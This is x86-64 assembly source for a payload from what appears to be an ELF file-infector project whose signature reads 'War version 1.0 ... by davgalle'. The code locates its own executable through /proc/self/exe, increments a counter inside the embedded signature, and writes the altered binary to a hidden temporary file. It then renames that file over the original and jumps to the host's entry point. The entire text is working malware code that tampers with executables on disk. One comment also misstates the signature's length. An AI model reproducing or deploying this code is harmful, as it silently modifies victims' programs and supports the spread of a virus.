section .text
global _ft_payload

_ft_payload:
    jmp     code_start

data_start:
entry_delta:    dq 0xDEADBEEF               ; offset 2
sig_offset:     dq 0xDEADBEEF               ; offset 10
path_self:      db "/proc/self/exe", 0      ; offset 18
path_temporal:  db "/tmp/.hidden", 0        ; offset 33

code_start:
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15
    push    rdx

    call    .get_base
.get_base:
    pop     rbx
    sub     rbx, (.get_base - _ft_payload)

    sub     rsp, 1056

    ; 1. readlink (/proc/self/exe)
    mov     rax, 89
    lea     rdi, [rbx + (path_self - _ft_payload)]
    mov     rsi, rsp
    mov     rdx, 1024
    syscall
    cmp     rax, 0
    jl      .restore_stack
    mov     byte [rsp + rax], 0

    ; 2. open original binary
    mov     rax, 2
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .restore_stack
    mov     r14, rax

    ; 3. lseek to get file size
    mov     rax, 8
    mov     rdi, r14
    xor     rsi, rsi
    mov     rdx, 2
    syscall
    mov     r15, rax

    ; 4. mmap original binary
    mov     rax, 9
    xor     rdi, rdi
    mov     rsi, r15
    mov     rdx, 3
    mov     r10, 2
    mov     r8, r14
    xor     r9, r9
    syscall
    cmp     rax, -1
    je      .close_orig
    mov     r13, rax

    ; 5. Ir al inicio de la firma (sig_offset)
    mov     rdi, [rbx + 10]             ; rdi = sig_offset
    add     rdi, r13                    ; rdi = dirección en el mapeo

    ; 6. Buscar el ÚLTIMO guion '-' de la firma (el de "davgalle - 39775")
    ;    La firma mide 50 bytes: "War version 1.0 (c)oded Oct - 2026 by davgalle - 39775"
    ;    Buscamos desde el final hacia atrás hasta encontrar el guion.
    lea     rdx, [rdi + 50]             ; rdx = final de la firma (aprox)
    mov     rcx, 60                     ; máximo 60 bytes hacia atrás
.find_last_dash:
    dec     rdx
    cmp     byte [rdx], '-'
    je      .found_last_dash
    loop    .find_last_dash
    jmp     .munmap_buf                 ; no encontrado, abortar

.found_last_dash:
    ; rdx apunta al guion de "davgalle - 39775"
    ; avanzar 2 bytes: " - " → '3' de 39775
    add     rdx, 2

    ; 7. Leer el número de 5 dígitos (39775)
    push    rdx
    xor     r12, r12
    mov     rcx, 5
.conv_num:
    movzx   eax, byte [rdx]
    sub     eax, '0'
    imul    r12, r12, 10
    add     r12, rax
    inc     rdx
    loop    .conv_num

    inc     r12                         ; incrementar el contador

    ; 8. Escribir el nuevo número de 5 dígitos
    pop     rdi                         ; rdi = inicio del número (primer '3')
    add     rdi, 4                      ; apuntar al último dígito
    mov     rax, r12
    mov     rcx, 5
.conv_str:
    xor     rdx, rdx
    mov     r8, 10
    div     r8
    add     dl, '0'
    mov     [rdi], dl
    dec     rdi
    loop    .conv_str

    ; 9. open temporal file
    mov     rax, 2
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, 0x241
    mov     rdx, 0x1ed
    syscall
    cmp     rax, 0
    jl      .munmap_buf
    mov     r12, rax

    ; 10. write infected content to temporal file
    mov     rax, 1
    mov     rdi, r12
    mov     rsi, r13
    mov     rdx, r15
    syscall

    ; 11. fsync
    mov     rax, 74
    mov     rdi, r12
    syscall

    ; 12. close temporal file
    mov     rax, 3
    mov     rdi, r12
    syscall

    ; 13. chmod temporal file
    mov     rax, 90
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, 0x1ed
    syscall

.munmap_buf:
    mov     rax, 11
    mov     rdi, r13
    mov     rsi, r15
    syscall

.close_orig:
    mov     rax, 3
    mov     rdi, r14
    syscall

    ; 14. rename temporal file over original path
    mov     rax, 82
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, rsp
    syscall

.restore_stack:
    add     rsp, 1056

    pop     rdx
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx

    call    .get_ip
.get_ip:
    pop     rax
    sub     rax, (.get_ip - _ft_payload)
    mov     rcx, [rax + 2]
    add     rax, rcx
    jmp     rax